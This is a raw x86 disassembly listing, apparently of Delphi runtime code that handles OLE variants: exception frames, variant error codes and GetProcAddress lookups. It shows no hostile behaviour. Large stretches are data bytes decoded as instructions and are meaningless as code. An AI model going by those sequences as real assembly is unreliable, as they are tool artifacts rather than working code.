call j_sub_449348
retn
sub_43da38
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_43da98
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4372c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_449f90
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43da9f
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43daa8
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_43db0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_438528
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x4 ]
call sub_449f90
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db11
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43db1c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_43db80
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_435b70
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_449f90
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43db87
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43db90
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_43dbbc
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleW
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_43d748
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d778
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d778
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d784
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d790
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d79c
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d808
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d874
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d8e0
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d94c
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43d9b8
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43da38
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43daa8
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_43db1c
mov eax r-xdata
call sub_43db90
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_43ded4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43def9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43df00
retn
sub_43e040
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
outsb
jbe r-xdata
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
inc ebx
popad
jae r-xdata
insb
inc ebp
jb r-xdata
inc ebx
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
jb r-xdata
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
jb r-xdata
outsd
ja r-xdata
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
loopne r-xdata
popfd
or al 0xe1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
outsd
jb r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
inc ebx
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
nop
test cl ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
popad
outsb
je r-xdata
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
outsb
jbe r-xdata
jb r-xdata
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x1c0043 ] cl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
nop
cld
loope r-xdata
inc ebx
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
sbb al 0x9e
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
jb r-xdata
sbb [ esi - 0x7bbbffbd ] 0x44
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
popad
push esi
inc ebx
insb
js r-xdata
jb r-xdata
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
inc esp
popfd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x43 ] bh
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
inc esp
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc ebx
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
add al bl
popad
outsb
je r-xdata
dec esp
outsd
jb r-xdata
popfd
inc ebx
dec eax
jns r-xdata
popad
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
push esi
loop r-xdata
add al bl
popad
outsb
je r-xdata
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] bl
inc ebp
add [ edx + eax * 4 + 0x44 ] dh
jb r-xdata
jns r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
loop r-xdata
nop
jecxz r-xdata
outsb
popad
dec ecx
inc ebp
jb r-xdata
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
inc esp
add [ eax ] al
add [ eax ] al
push 0x6c004484
outsd
je r-xdata
popfd
inc ebx
add [ eax ] ch
sahf
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
jb r-xdata
push esi
popad
jb r-xdata
popad
jns r-xdata
inc ebx
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jecxz r-xdata
nop
nop
loopne r-xdata
popad
outsb
je r-xdata
add [ eax + eax + 0x64 ] 0xd8004481
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
inc esp
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x43 ] ch
js r-xdata
outsd
add al bl
popad
outsb
je r-xdata
popfd
inc ebx
inc esp
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
insd
jo r-xdata
push esi
popad
jb r-xdata
popad
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc ebx
add [ esi + ebx * 4 ] bl
popad
je r-xdata
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
inc ebp
push esi
popad
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jecxz r-xdata
sbb [ esi - 0x7bbbffbd ] 0x44
add [ esp + eax * 4 + 0x44 ] ah
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
popad
outsb
je r-xdata
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edi ] dl
inc ebp
push esi
popad
test [ eax + eax + 0x68 ] al
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ eax ] bl
inc ebp
push esi
popad
popad
outsb
je r-xdata
inc ebx
add [ eax * 2 + 0x69726156 ] dl
sahf
inc ebp
jb r-xdata
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ eax ] ch
sahf
inc ebx
je r-xdata
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
outsb
js r-xdata
jb r-xdata
dec edi
dec bp
insd
outsd
jb r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
retn
popad
outsb
je r-xdata
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
push 0x6f727245
popad
outsb
je r-xdata
arpl [ gs : ebp + 0x64 ] si
jb r-xdata
inc ebp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x43
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
nop
nop
aam 0xe4
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
in al 0x43
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x1c442790
add [ eax ] al
add [ eax + 0x6c004341 ] ch
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
nop
nop
pop esp
in al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] ah
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e6b5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
outsb
jbe r-xdata
popfd
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
in eax 0x43
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
nop
inc eax
out 0x43 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] cl
inc ebx
popfd
inc ebx
inc ebx
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
outsd
jb r-xdata
jo r-xdata
outsd
jb r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
jb r-xdata
jb r-xdata
outsd
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
in eax 0x43
add [ eax ] al
add [ eax ] al
inc ebx
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
sbb al 0x9e
inc ebp
arpl [ ebp + 0x64 ] si
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsubr st4
inc ebx
nop
nop
push eax
in eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] bl
inc ebx
add [ eax + eax ] bl
add [ eax ] al
test al 0x41
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
inc edi
out 0x43 eax
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_444d38
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_444d38
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e74e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_44936c
retn
outsd
jb r-xdata
add [ eax + eax ] bl
add [ eax ] al
cmp al 0xe0
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
out 0x43 al
sub_43e664
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43e6ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e6b5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43e6b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e747
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_444d38
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_444d38
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e74e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_44936c
retn
sub_43e754
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43e79e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e7a5
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43e7a8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43e7f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e7f9
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43e7fc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e88b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_444d38
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_444d38
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e892
lea eax [ ebp - 0x1c ]
mov edx 0x3
call j_sub_44936c
retn
sub_43e898
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_43e8e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e8e9
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_43e8ec
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43eb31
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eb38
lea eax [ ebp - 0x40 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call j_sub_44936c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x18 ]
